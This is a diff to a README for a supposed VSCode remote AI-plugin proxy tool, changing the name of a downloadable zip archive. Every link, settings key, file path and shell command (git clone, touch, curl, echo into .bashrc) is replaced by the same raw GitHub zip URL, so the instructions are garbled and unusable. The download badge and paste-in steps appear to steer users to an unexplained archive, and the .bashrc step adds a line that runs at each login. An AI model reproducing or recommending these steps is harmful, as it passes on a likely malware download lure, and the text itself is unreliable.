@@ -1,6 +1,6 @@
 # 🎮 vscode-remote-vibe-coding - Easy AI Plugin Access for Remote VSCode
 
-[![Download](https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip)](https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip)
+[![Download](https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip)](https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -31,13 +31,13 @@ To allow VSCode remote usage of AI plugins, follow these steps:
 
 1. Open VSCode.
 2. Navigate to the settings by clicking on the gear icon and selecting "Settings."
-3. Search for `https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip`.
+3. Search for `https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip`.
 4. Add the following configuration:
 
 ```json
 {
-  "https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip": "http://127.0.0.1:7890",
-  "https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip": false
+  "https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip": "http://127.0.0.1:7890",
+  "https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip": false
 }
 ```
 
@@ -52,9 +52,9 @@ If you need remote servers to access the internet directly (using pip, git, wget
    Use the following commands in your remote terminal:
 
    ```bash
-   git clone https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
+   git clone https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip
    cd clash-for-AutoDL
-   https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
+   https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip
    ```
 
 2. **Create Startup Script**:
@@ -62,7 +62,7 @@ If you need remote servers to access the internet directly (using pip, git, wget
    Create a script that starts automatically:
 
    ```bash
-   echo "sh ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip" >> https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
+   echo "sh ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip" >> https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip
    ```
 
 3. **Update Proxy Functions**:
@@ -70,7 +70,7 @@ If you need remote servers to access the internet directly (using pip, git, wget
    Add a proxy functions library to your user directory:
 
    ```bash
-   touch ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
+   touch ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip
    ```
 
 4. **Change Bash Configuration**:
@@ -78,7 +78,7 @@ If you need remote servers to access the internet directly (using pip, git, wget
    Modify your `.bashrc` to include your proxy:
 
    ```bash
-   echo "source ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip" >> ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
+   echo "source ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip" >> ~https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip
    ```
 
 5. **Verify Setup**:
@@ -86,14 +86,14 @@ If you need remote servers to access the internet directly (using pip, git, wget
    After configuring your setup, restart your system and check if the proxy runs correctly using:
 
    ```bash
-   curl https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip
+   curl https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip
    ```
 
 ## 🛠️ Troubleshooting Common Issues
 
 1. **Unable to connect to the proxy**:
    - Check if the proxy server is running.
-   - Ensure the port matches your `https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip`.
+   - Ensure the port matches your `https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip`.
 
 2. **AI plugins not working**:
    - Ensure all configurations were applied as directed.
@@ -114,4 +114,4 @@ A2: Yes, as long as the plugin can operate via an HTTP proxy.
 **Q3: What if I face issues during installation?**  
 A3: Check the troubleshooting section. If problems persist, reach out for support via this repository.
 
-For further details or updates, visit our [GitHub page](https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/vscode-remote-vibe-coding.zip) regularly. Happy coding!
+For further details or updates, visit our [GitHub page](https://raw.githubusercontent.com/sharkfan824/vscode-remote-vibe-coding/main/polyphylety/remote-coding-vscode-vibe-2.5.zip) regularly. Happy coding!
